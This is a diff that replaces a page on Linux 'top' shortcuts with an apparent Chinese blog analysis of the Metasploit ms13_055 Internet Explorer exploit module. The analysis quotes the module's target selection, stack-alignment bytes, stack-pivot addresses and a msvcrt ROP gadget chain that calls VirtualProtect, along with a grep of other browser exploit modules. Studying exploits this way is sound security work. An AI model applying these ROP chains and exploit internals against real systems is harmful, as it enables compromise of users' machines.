@@ -1,7 +1,256 @@
 <html xmlns="http://www.w3.org/1999/xhtml" lang="zh-cn">
 <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"></head>
-<title>linux top&#x76D1;&#x63A7;&#x7684;&#x4F7F;&#x7528;</title>
-<body><p>b : toggle highlight</p>
-<p>x : toggle sort row highlight</p>
-<p>shift + &lt; &gt; : switch sort row</p></body>
+<title>ms13_055 metasploit</title>
+<body><div class="cnblogs_Highlighter">
+<pre class="brush:csharp;gutter:true;">111   def get_payload(t)
+112     if t['Rop'] == :msvcrt
+113       print_status("Using msvcrt ROP")
+114       esp_align = "\x81\xc4\x54\xf2\xff\xff"
+115       rop_dll = 'msvcrt'
+116       opts    = {'target'=&gt;'xp'}
+117     else
+118       print_status("Using JRE ROP")
+119       esp_align = "\x81\xEC\xF0\xD8\xFF\xFF" # sub esp, -10000
+120       rop_dll = 'java'
+121       opts    = {}
+122     end
+</pre>
+</div>
+<p>　　</p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:csharp;gutter:true;">daniel@daniel-mint ~/ms13_055 $ echo "81 c4 54 f2 ff ff" | ascii2binary -b h -t uc | x86dis -e 0 -s inte<br />l00000000 81 C4 54 F2 FF FF            	add	esp, 0xFFFFF254
+</pre>
+</div>
+<p>　　</p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:csharp;gutter:true;">daniel@daniel-mint ~/ms13_055 $ echo "81 ec f0 d8 ff ff" | ascii2binary -b h -t uc | x86dis -e 0 -s intel
+00000000 81 EC F0 D8 FF FF            	sub	esp, 0xFFFFD8F0
+</pre>
+</div>
+<p>　　</p>
+<p>esp_align代表的汇编语句的作用是对齐esp，即栈指针。</p>
+<hr />
+<p>&nbsp;</p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:csharp;gutter:true;"> 87   def get_target(agent)
+ 88     return target if target.name != 'Automatic'
+ 89 
+ 90     nt = agent.scan(/Windows NT (\d\.\d)/).flatten[0] || ''
+ 91     ie = agent.scan(/MSIE (\d)/).flatten[0] || ''
+ 92 
+ 93     ie_name = "IE #{ie}"
+ 94 
+ 95     case nt
+ 96     when '5.1'
+ 97       os_name = 'Windows XP SP3'
+ 98     when '6.1'
+ 99       os_name = 'Windows 7'
+100     end
+101 
+102     targets.each do |t|
+103       if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))
+104         return t
+105       end
+106     end
+107 
+108     nil
+109   end
+</pre>
+</div>
+<p>　　</p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:csharp;gutter:true;">188   def on_request_uri(cli, request)
+189     agent = request.headers['User-Agent']
+190     t = get_target(agent)
+</pre>
+</div>
+<p>　　</p>
+<p>当远程的网页客户端发出HTTP请求页面时，get_target会根据请求Header中的User-Agent信息来了解客户端操作系统以及浏览器的版本情况，然后根据预设的情况来</p>
+<p>返回与版本相关的数据</p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:csharp;gutter:true;"> 52       'Targets'        =&gt;
+ 53         [
+ 54           [ 'Automatic', {} ],
+ 55           [
+ 56             'IE 8 on Windows XP SP3',
+ 57             {
+ 58               'Rop'   =&gt; :msvcrt,
+ 59               'Pivot' =&gt; 0x77c15ed5, # xchg eax, esp; ret
+ 60               'Align' =&gt; 0x77c4d801  # add esp, 0x2c; ret
+ 61             }
+ 62           ],
+ 63           [
+ 64             'IE 8 on Windows 7',
+ 65             {
+ 66               'Rop'   =&gt; :jre,
+ 67               'Pivot' =&gt; 0x7c348b05, # xchg eax, esp; ret
+ 68               'Align' =&gt; 0x7C3445F8  # add esp, 0x2c; ret
+ 69             }
+ 70           ]
+ 71         ],
+</pre>
+</div>
+<p>　　</p>
+<p>如果当前的系统不支持，就会返回404页面。</p>
+<hr />
+<p>&nbsp;</p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:csharp;gutter:true;">111   def get_payload(t)
+112     if t['Rop'] == :msvcrt
+113       print_status("Using msvcrt ROP")
+114       esp_align = "\x81\xc4\x54\xf2\xff\xff"
+115       rop_dll = 'msvcrt'
+116       opts    = {'target'=&gt;'xp'}
+117     else
+118       print_status("Using JRE ROP")
+119       esp_align = "\x81\xEC\xF0\xD8\xFF\xFF" # sub esp, -10000
+120       rop_dll = 'java'
+121       opts    = {}
+122     end
+123 
+124     p = esp_align + payload.encoded + rand_text_alpha(12000)
+125     generate_rop_payload(rop_dll, p, opts)
+126   end
+</pre>
+</div>
+<p>　　</p>
+<p>generate_rop_payload</p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:csharp;gutter:true;"> 77   def generate_rop_payload(rop, payload, opts={})
+ 78     nop      = opts['nop']      || nil
+ 79     badchars = opts['badchars'] || ''
+ 80     pivot    = opts['pivot']    || ''
+ 81     target   = opts['target']   || ''
+ 82     base     = opts['base']     || nil
+ 83 
+ 84     rop = select_rop(rop, {'target'=&gt;target, 'base'=&gt;base})
+ 85     # Replace the reserved words with actual gadgets
+ 86     rop = rop.map {|e|
+ 87       if e == :nop
+ 88         sled = (nop) ? nop.generate_sled(4, badchars).unpack("V*")[0] : 0x90909090
+ 89       elsif e == :junk
+ 90         Rex::Text.rand_text(4, badchars).unpack("V")[0].to_i
+ 91       elsif e == :size
+ 92         payload.length
+ 93       elsif e == :unsafe_negate_size
+ 94         get_unsafe_size(payload.length)
+ 95       elsif e == :safe_negate_size
+ 96         get_safe_size(payload.length)
+ 97       else
+ 98         e
+ 99       end
+100     }.pack("V*")
+101 
+102     raise RuntimeError, "No ROP chain generated successfully" if rop.empty?
+103 
+104     return pivot + rop + payload
+105   end
+</pre>
+</div>
+<p>　　</p>
+<p>会从data目录下查找定义好的[module].xml的文件，然后将gadgets中的宏定义展开，然后与pivot + gadgets + payload返回。</p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:csharp;gutter:true;">  3 &lt;rop&gt;
+  4         &lt;compatibility&gt;
+  5                 &lt;target&gt;WINDOWS XP SP2&lt;/target&gt;
+  6                 &lt;target&gt;WINDOWS XP SP3&lt;/target&gt;
+  7         &lt;/compatibility&gt;
+  8 
+  9         &lt;gadgets base="0x77c10000"&gt;
+ 10                 &lt;gadget offset="0x0002b860"&gt;POP EAX # RETN&lt;/gadget&gt;
+ 11                 &lt;gadget value="safe_negate_size"&gt;0xFFFFFBFF -&gt; ebx&lt;/gadget&gt;
+ 12                 &lt;gadget offset="0x0000be18"&gt;NEG EAX # POP EBP # RETN&lt;/gadget&gt;
+ 13                 &lt;gadget value="junk"&gt;JUNK&lt;/gadget&gt;
+ 14                 &lt;gadget offset="0x0001362c"&gt;POP EBX # RETN&lt;/gadget&gt;
+ 15                 &lt;gadget offset="0x0004d9bb"&gt;Writable location&lt;/gadget&gt;
+ 16                 &lt;gadget offset="0x0001e071"&gt;XCHG EAX, EBX # ADD BYTE [EAX], AL # RETN&lt;/gadget&gt;
+ 17                 &lt;gadget offset="0x00040d13"&gt;POP EDX # RETN&lt;/gadget&gt;
+ 18                 &lt;gadget value="0xFFFFFFC0"&gt;0xFFFFFFC0-&gt; edx&lt;/gadget&gt;
+ 19                 &lt;gadget offset="0x00048fbc"&gt;XCHG EAX, EDX # RETN&lt;/gadget&gt;
+ 20                 &lt;gadget offset="0x0000be18"&gt;NEG EAX # POP EBX # RETN&lt;/gadget&gt;
+ 21                 &lt;gadget value="junk"&gt;JUNK&lt;/gadget&gt;
+ 22                 &lt;gadget offset="0x00048fbc"&gt;XCHG EAX, EDX # RETN&lt;/gadget&gt;
+ 23                 &lt;gadget offset="0x0002ee15"&gt;POP EBP # RETN&lt;/gadget&gt;
+ 24                 &lt;gadget offset="0x0002ee15"&gt;skip 4 bytes&lt;/gadget&gt;
+ 25                 &lt;gadget offset="0x0002eeef"&gt;POP ECX # RETN&lt;/gadget&gt;
+ 26                 &lt;gadget offset="0x0004d9bb"&gt;Writable location&lt;/gadget&gt;
+ 27                 &lt;gadget offset="0x0001a88c"&gt;POP EDI # RETN&lt;/gadget&gt;
+ 28                 &lt;gadget offset="0x00029f92"&gt;RETN (ROP NOP)&lt;/gadget&gt;
+ 29                 &lt;gadget offset="0x0002a184"&gt;POP ESI # RETN&lt;/gadget&gt;
+ 30                 &lt;gadget offset="0x0001aacc"&gt;JMP [EAX]&lt;/gadget&gt;
+ 31                 &lt;gadget offset="0x0002b860"&gt;POP EAX # RETN&lt;/gadget&gt;
+ 32                 &lt;gadget offset="0x00001120"&gt;ptr to VirtualProtect()&lt;/gadget&gt;
+ 33                 &lt;gadget offset="0x00002df9"&gt;PUSHAD # RETN&lt;/gadget&gt;
+ 34                 &lt;gadget offset="0x00025459"&gt;ptr to 'push esp #  ret&lt;/gadget&gt;
+ 35         &lt;/gadgets&gt;
+ 36 &lt;/rop&gt;
+</pre>
+</div>
+<p>　　</p>
+<hr />
+<p>&nbsp;</p>
+<p>在查找Windows下Browser相关的ROP漏洞</p>
+<div class="cnblogs_Highlighter">
+<pre class="brush:csharp;gutter:true;">daniel@daniel-mint ~/msf/metasploit-framework/modules/exploits/windows/browser $ grep generate_rop_payload *.rb -n
+adobe_flash_mp4_cprt.rb:148:    code = generate_rop_payload(rop_name, code, {'target'=&gt;rop_target})
+adobe_flash_otf_font.rb:100:      p = generate_rop_payload('flash', payload.encoded, {'target'=&gt;'11.3.300.257', 'pivot'=&gt;pivot})
+adobe_flash_otf_font.rb:110:      p = generate_rop_payload('flash', payload.encoded, {'target'=&gt;'11.3.300.265', 'pivot'=&gt;pivot})
+adobe_flash_otf_font.rb:120:      p = generate_rop_payload('flash', payload.encoded, {'target'=&gt;'11.3.300.268', 'pivot'=&gt;pivot})
+adobe_flash_otf_font.rb:130:      p = generate_rop_payload('java', payload.encoded, {'pivot'=&gt;pivot})
+adobe_flashplayer_flash10o.rb:194:      p = generate_rop_payload('java', payload.encoded)
+adobe_flash_rtmp.rb:135:    code &lt;&lt; generate_rop_payload('msvcrt', p, {'target'=&gt;'xp'})
+adobe_toolbutton.rb:77:    rop_10 = Rex::Text.to_unescape(generate_rop_payload('reader', '', { 'target' =&gt; '10' }))
+adobe_toolbutton.rb:78:    rop_11 = Rex::Text.to_unescape(generate_rop_payload('reader', '', { 'target' =&gt; '11' }))
+aladdin_choosefilepath_bof.rb:147:      p = generate_rop_payload('msvcrt', get_payload(cli, target_info), {'target'=&gt;'xp'})
+apple_quicktime_mime_type.rb:153:      code = generate_rop_payload('msvcrt', payload.encoded, {'target'=&gt;'xp'})
+apple_quicktime_rdrf.rb:65:    p = generate_rop_payload('msvcrt', alignment + payload.encoded, {'target'=&gt;'xp'})
+crystal_reports_printcontrol.rb:178:    rop_payload = generate_rop_payload('java', code, {'pivot' =&gt; [t['Pivot']].pack("V")})
+hp_loadrunner_writefilebinary.rb:207:      rop_payload = fake_object + generate_rop_payload('java', code)#, {'pivot'=&gt;stack_pivot})
+ie_cbutton_uaf.rb:148:        rop_payload = generate_rop_payload('msvcrt', msvcrt_align + code, {'target'=&gt;'xp'})
+ie_cbutton_uaf.rb:150:        rop_payload = generate_rop_payload('msvcrt', msvcrt_align + code, {'target'=&gt;'2003'})
+ie_cbutton_uaf.rb:153:      rop_payload = generate_rop_payload('java', java_align + code)
+ie_cgenericelement_uaf.rb:126:        rop_payload = generate_rop_payload('msvcrt', align+p, {'target'=&gt;'xp'})
+ie_cgenericelement_uaf.rb:128:        rop_payload = generate_rop_payload('msvcrt', align+p, {'target'=&gt;'2003'})
+ie_cgenericelement_uaf.rb:136:      rop_payload = generate_rop_payload('java', code)
+ie_execcommand_uaf.rb:139:      rop_payload = generate_rop_payload('msvcrt', code, {'pivot'=&gt;stack_pivot, 'target'=&gt;'xp'})
+ie_execcommand_uaf.rb:158:      rop_payload = generate_rop_payload('java', code, {'pivot'=&gt;stack_pivot})
+ie_setmousecapture_uaf.rb:98:      rop = generate_rop_payload('hxds', code, { 'target'=&gt;'2007' })
+ie_setmousecapture_uaf.rb:112:      rop = generate_rop_payload('hxds', code, { 'target'=&gt;'2010' })
+indusoft_issymbol_internationalseparator.rb:219:      rop_payload = generate_rop_payload('msvcrt', code,  {'pivot'=&gt;stack_pivot, 'target'=&gt;'xp'})
+indusoft_issymbol_internationalseparator.rb:231:      rop_payload = generate_rop_payload('java', code, {'pivot'=&gt;stack_pivot})
+inotes_dwa85w_bof.rb:204:      rop_payload = generate_rop_payload('msvcrt', code, {'target'=&gt;'xp'})#{'pivot'=&gt;stack_pivot, 'target'=&gt;'xp'})
+mozilla_firefox_onreadystatechange.rb:108:    code &lt;&lt; generate_rop_payload('msvcrt', stack_pivot + payload.encoded, {'target'=&gt;'xp'})
+mozilla_firefox_xmlserializer.rb:110:    code &lt;&lt; generate_rop_payload('msvcrt', stack_pivot + payload.encoded, {'target'=&gt;'xp'})
+ms10_002_ie_object.rb:248:      rop_payload = generate_rop_payload('msvcrt', p, {'target'=&gt;'xp'})
+ms10_002_ie_object.rb:250:      rop_payload = generate_rop_payload('java', p)
+ms11_050_mshtml_cobjectelement.rb:182:      rop_payload = generate_rop_payload('java', p)
+ms11_081_option.rb:137:      rop_payload = generate_rop_payload('msvcrt', "", {'target'=&gt;'xp'})
+ms11_081_option.rb:144:      rop_payload = generate_rop_payload('java', '')
+ms12_004_midi.rb:519:    generate_rop_payload('msvcrt', p, {'pivot'=&gt;padding, 'target'=&gt;'xp'})
+ms12_037_same_id.rb:133:      rop = generate_rop_payload('msvcrt', '', {'target'=&gt;'xp', 'pivot'=&gt;pivot})
+ms12_037_same_id.rb:137:      rop = generate_rop_payload('java', '', {'pivot'=&gt;pivot})
+ms13_009_ie_slayoutrun_uaf.rb:128:      rop_payload = generate_rop_payload('msvcrt', "", {'target'=&gt;'xp'})
+ms13_037_svg_dashstyle.rb:218:      rop_payload = generate_rop_payload('java', code, {'pivot'=&gt;stack_pivot})
+ms13_055_canchor.rb:125:    generate_rop_payload(rop_dll, p, opts)
+ms13_059_cflatmarkuppointer.rb:120:    generate_rop_payload('java', code, {'pivot'=&gt;stack_pivot})
+ms13_069_caret.rb:97:    p &lt;&lt; generate_rop_payload('msvcrt', payload.encoded, {'target'=&gt;'xp'})
+ms13_080_cdisplaypointer.rb:157:      rop_payload = generate_rop_payload('hxds', payload.encoded, {'target'=&gt;'2007', 'pivot'=&gt;pivot})
+ms13_080_cdisplaypointer.rb:174:      rop_payload = generate_rop_payload('hxds', payload.encoded, {'target'=&gt;'2010', 'pivot'=&gt;pivot})
+ms13_080_cdisplaypointer.rb:186:        rop_payload = generate_rop_payload('msvcrt', payload.encoded, {'target'=&gt;'xp', 'pivot'=&gt;pivot})
+ms13_080_cdisplaypointer.rb:197:        rop_payload = generate_rop_payload('java', payload.encoded, {'pivot'=&gt;pivot})
+ms13_090_cardspacesigninhelper.rb:108:    rop_payload = generate_rop_payload('msvcrt', get_payload(cli, target_info), {'target'=&gt;'xp', 'pivot' =&gt; stack_pivot})
+ms14_012_textrange.rb:85:    p = generate_rop_payload('hxds', payload.encoded, {'target'=&gt;'2010', 'pivot'=&gt;setup})
+msxml_get_definition_code_exec.rb:189:        rop = generate_rop_payload('msvcrt','',{'target'=&gt;'xp', 'pivot'=&gt;adjust})
+msxml_get_definition_code_exec.rb:193:        rop = generate_rop_payload('java','',{'pivot'=&gt;adjust})
+novell_groupwise_gwcls1_actvx.rb:207:        rop_payload = generate_rop_payload('msvcrt', '', 'target'=&gt;'xp') # Mapped at 0x0c0c07ea
+novell_groupwise_gwcls1_actvx.rb:217:        rop_payload = generate_rop_payload('java', '') # Mapped at 0x0c0c07ea
+ntr_activex_check_bof.rb:270:        rop_payload = generate_rop_payload('msvcrt', code, {'target'=&gt;'xp'})
+ntr_activex_check_bof.rb:274:        rop_payload = generate_rop_payload('java', code)
+quickr_qp2_bof.rb:202:      rop_payload = generate_rop_payload('java', code)#, {'pivot'=&gt;stack_pivot})
+siemens_solid_edge_selistctrlx.rb:398:    return generate_rop_payload('msvcrt', payload.encoded, {'pivot'=&gt; fake_memory, 'target'=&gt;'xp'})
+vlc_amv.rb:143:      code = generate_rop_payload('java', payload.encoded)
+</pre>
+</div>
+<p>　　</p>
+<p>&nbsp;</p></body>
 </html>
